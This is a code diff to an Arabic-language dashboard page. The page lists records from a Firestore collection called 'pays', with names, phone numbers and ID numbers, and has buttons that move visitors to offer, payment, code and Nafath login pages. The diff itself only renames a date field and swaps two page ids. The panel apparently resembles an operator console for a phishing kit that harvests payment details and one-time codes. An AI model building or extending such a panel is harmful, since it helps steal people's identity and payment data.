@@ -99,7 +99,7 @@ function useOnlineUsersCount() {
 interface Notification {
   // Basic info
   id: string
-  createdAt: string
+  createdDate: string
   country?: string
   currentPage?: string
   isHidden?: boolean
@@ -356,8 +356,8 @@ function ActivityTimeline({ notifications }: { notifications: Notification[] }) 
                 </p>
               </div>
               <p className="text-xs text-muted-foreground whitespace-nowrap">
-                {notification.createdAt &&
-                  formatDistanceToNow(new Date(notification.createdAt), {
+                {notification.createdDate &&
+                  formatDistanceToNow(new Date(notification.createdDate), {
                     addSuffix: true,
                     locale: ar,
                   })}
@@ -1069,7 +1069,7 @@ export default function NotificationsPage() {
 
   const fetchNotifications = useCallback(() => {
     setIsLoading(true)
-    const q = query(collection(db, "pays"), orderBy("createdAt", "desc"))
+    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
 
     const unsubscribe = onSnapshot(
       q,
@@ -1080,7 +1080,7 @@ export default function NotificationsPage() {
           return {
             id: doc.id,
             // Map old field names to new field names
-            createdAt: data.createdDate || data.createdAt,
+            createdDate: data.createdDate || data.createdDate,
             ownerFullName: data.documment_owner_full_name || data.ownerFullName,
             phoneNumber: data.phone || data.phoneNumber,
             ownerIdNumber: data.owner_identity_number || data.ownerIdNumber,
@@ -1514,8 +1514,8 @@ export default function NotificationsPage() {
                           <div className="flex items-center gap-2">
                             <Clock className="h-3.5 w-3.5" />
                             <span>
-                              {notification.createdAt &&
-                                formatDistanceToNow(new Date(notification.createdAt), {
+                              {notification.createdDate &&
+                                formatDistanceToNow(new Date(notification.createdDate), {
                                   addSuffix: true,
                                   locale: ar,
                                 })}
@@ -1539,8 +1539,8 @@ export default function NotificationsPage() {
                               { page: "3", label: "عروض" },
                               { page: "6", label: "دفع" },
                               { page: "7", label: "كود" },
-                              { page: "8888", label: "خط" },
-                              { page: "9999", label: "نفاذ" },
+                              { page: "9999", label: "خط" },
+                              { page: "8888", label: "نفاذ" },
                             ].map((item) => (
                               <Button
                                 key={item.page}
